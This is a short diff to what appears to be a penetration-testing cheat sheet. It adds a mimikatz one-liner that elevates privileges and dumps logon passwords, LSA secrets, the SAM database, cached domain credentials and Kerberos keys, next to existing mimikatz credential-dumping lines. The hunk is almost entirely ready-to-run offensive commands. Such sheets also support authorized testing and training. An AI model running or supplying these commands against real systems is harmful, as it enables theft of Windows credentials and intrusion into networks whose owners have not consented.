@@ -763,7 +763,7 @@ lsadump::lsa /patch #both these dump SAM
 
 #OneLiner
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
-
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
 
 ## Ligolo-ng
